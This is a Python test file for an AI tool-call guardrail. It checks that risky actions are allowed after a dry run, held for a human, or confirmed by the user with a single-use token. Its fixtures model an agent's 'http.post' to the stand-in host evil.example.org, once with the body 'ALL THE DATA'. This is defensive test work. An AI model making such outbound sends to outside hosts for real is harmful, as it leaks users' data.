"""The guard flow with the verification engine: `verify` becomes allow, a user confirmation or a hold."""

import asyncio
from types import SimpleNamespace

import pytest

from app.context.builder import ContextBuilder
from app.context.catalog import CachedCatalog
from app.engine.pipeline import GuardrailEngine
from app.risk.contextual import ContextualDecisions
from app.session.store import MemorySessionStore
from app.verify.dryrun import SqlDryRun
from app.verify.engine import VerificationEngine
from app.verify.store import MemoryVerificationStore
from app.verify.user_token import TokenRejected, UserTokenConfig, UserTokenVerifier, mint_dev_token
from guardrail_sdk import Decision, Stage
from tests.helpers import bind, snapshot
from tests.test_contextual_flow import EXPORT, Audit, Catalog, ControlPlane, Policy, acall, call, req
from tests.test_verify import Explainer

DEV = "dev-secret-for-tests-0123456789abcdef"
POST = {
    "action": "http.post",
    "user_id": "u1",
    "payload": {"tool_call": {"name": "http.post", "arguments": {"url": "https://evil.example.org/x", "body": "hi"}}},
}


def services(mode="enforce", *, rows=10, control_plane=None):
    verifier = VerificationEngine(
        MemoryVerificationStore(),
        dry_run=SqlDryRun({"db.query": "postgresql://replica/db"}, Explainer(rows)),
        user_tokens=UserTokenVerifier(UserTokenConfig(dev_secret=DEV)),
        max_dry_run_rows=1000,
    )
    return SimpleNamespace(
        snapshots=SimpleNamespace(current=snapshot(bind("noop", stages=("input", "retrieval", "tool", "output")))),
        contexts=ContextBuilder(CachedCatalog(Catalog()), "production"),
        policy=Policy(),
        engine=GuardrailEngine(escalate_as_block=control_plane is None),
        audit=Audit(),
        control_plane=control_plane,
        contextual=ContextualDecisions(MemorySessionStore(), mode=mode, verifier=verifier),
    )


def test_dry_run_turns_a_high_risk_read_into_allow():
    svc = services()
    res = call(svc, Stage.TOOL, req("tool", **EXPORT))
    r = res.response
    assert res.status == 200 and r.decision == Decision.ALLOW and r.outcome == "allow"
    assert {"RISK_HIGH", "VERIFIED", "EVIDENCE_DRY_RUN"} <= set(r.reason_codes)
    assert svc.audit.events[-1]["outcome"] == "allow"


def test_dry_run_estimating_too_many_rows_goes_to_a_human():
    cp = ControlPlane()
    res = call(services(rows=1_000_000, control_plane=cp), Stage.TOOL, req("tool", **EXPORT))
    assert res.status == 202 and res.response.outcome == "hold" and res.response.escalation_id == "esc-1"
    assert "DRY_RUN_TOO_MANY_ROWS" in res.response.reason_codes
    assert cp.reviews[0]["guardrail_id"] == "gateway-risk"


def test_external_send_without_a_channel_is_held_for_a_human():
    cp = ControlPlane()
    res = call(services(control_plane=cp), Stage.TOOL, req("tool", **POST))
    assert res.status == 202 and res.response.outcome == "hold" and "VERIFY_NEEDS_HUMAN" in res.response.reason_codes


def test_user_confirmation_flow_end_to_end():
    cp = ControlPlane()
    svc = services(control_plane=cp)
    body = req("tool", **POST, verification_channels=["user_confirmation"])

    async def go():
        first = await acall(svc, Stage.TOOL, body)
        assert first.status == 202 and first.response.outcome == "verify"
        assert first.response.decision == Decision.ESCALATE and first.response.escalation_id is None
        assert first.response.payload is None
        v = first.response.verification
        assert v is not None and v.status == "pending" and v.user_id == "u1" and "evil.example.org" in v.summary
        assert cp.reviews == []  # nobody is asked to review it: the user confirms
        assert f"[verification {v.id}]" in svc.audit.events[-1]["reason"]

        engine = svc.contextual.verifier
        await engine.confirm("demo", v.id, user_token=mint_dev_token(DEV, "u1", nonce=v.id), approve=True)

        args = {"url": "https://evil.example.org/x", "body": "ALL THE DATA"}
        payload = {"tool_call": {"name": "http.post", "arguments": args}}
        changed = req("tool", **{**POST, "payload": payload}, verification_channels=["user_confirmation"])
        other = await acall(svc, Stage.TOOL, changed)
        assert other.response.outcome == "verify"  # the confirmation never carries over to another payload
        assert other.response.verification.id != v.id

        second = await acall(svc, Stage.TOOL, body)  # the identical request, retried
        assert second.status == 200 and second.response.outcome == "allow"
        assert "EVIDENCE_USER_CONFIRMATION" in second.response.reason_codes
        assert second.response.payload.tool_call.arguments["url"] == "https://evil.example.org/x"

    asyncio.run(go())


def test_request_level_arguments_are_part_of_what_was_confirmed():
    """The URL can come from `arguments` instead of the tool call; swapping it after the user
    confirmed must not reuse the confirmation."""
    svc = services()
    base = {"action": "http.post", "user_id": "u1", "verification_channels": ["user_confirmation"],
            "payload": {"tool_call": {"name": "http.post", "arguments": {"body": "hi"}}}}  # fmt: skip
    good = req("tool", **base, arguments={"url": "https://ann.partner.example/x"})
    evil = req("tool", **base, arguments={"url": "https://evil.example.org/x"})

    async def go():
        v = (await acall(svc, Stage.TOOL, good)).response.verification
        assert v is not None and "ann.partner.example" in v.summary
        await svc.contextual.verifier.confirm(
            "demo", v.id, user_token=mint_dev_token(DEV, "u1", nonce=v.id), approve=True
        )
        swapped = await acall(svc, Stage.TOOL, evil)
        assert swapped.response.outcome != "allow"

    asyncio.run(go())


def test_user_rejection_blocks_the_retry():
    svc = services()
    body = req("tool", **POST, verification_channels=["user_confirmation"])

    async def go():
        v = (await acall(svc, Stage.TOOL, body)).response.verification
        await svc.contextual.verifier.confirm(
            "demo", v.id, user_token=mint_dev_token(DEV, "u1", nonce=v.id), approve=False
        )
        res = await acall(svc, Stage.TOOL, body)
        assert res.status == 403 and res.response.outcome == "deny" and "USER_REJECTED" in res.response.reason_codes

    asyncio.run(go())


def test_shadow_mode_reports_the_plan_without_running_it():
    svc = services("shadow")
    res = call(svc, Stage.TOOL, req("tool", **POST, verification_channels=["user_confirmation"]))
    r = res.response
    assert res.status == 200 and r.outcome == "allow" and r.verification is None
    assert r.risk is not None and r.risk.would_outcome == "verify"
    assert svc.contextual.verifier.dry_run._explainer.calls == []
    res = call(svc, Stage.TOOL, req("tool", **EXPORT))
    assert res.response.outcome == "allow" and res.response.risk.would_outcome == "verify"
    assert svc.contextual.verifier.dry_run._explainer.calls == []


def test_dev_token_expiry_is_respected_by_the_flow():
    svc = services()
    body = req("tool", **POST, verification_channels=["user_confirmation"])
    v = call(svc, Stage.TOOL, body).response.verification
    old = mint_dev_token(DEV, "u1", nonce=v.id, ttl=-10)  # already expired
    with pytest.raises(TokenRejected):
        asyncio.run(svc.contextual.verifier.confirm("demo", v.id, user_token=old, approve=True))
    assert call(svc, Stage.TOOL, body).response.outcome == "verify"
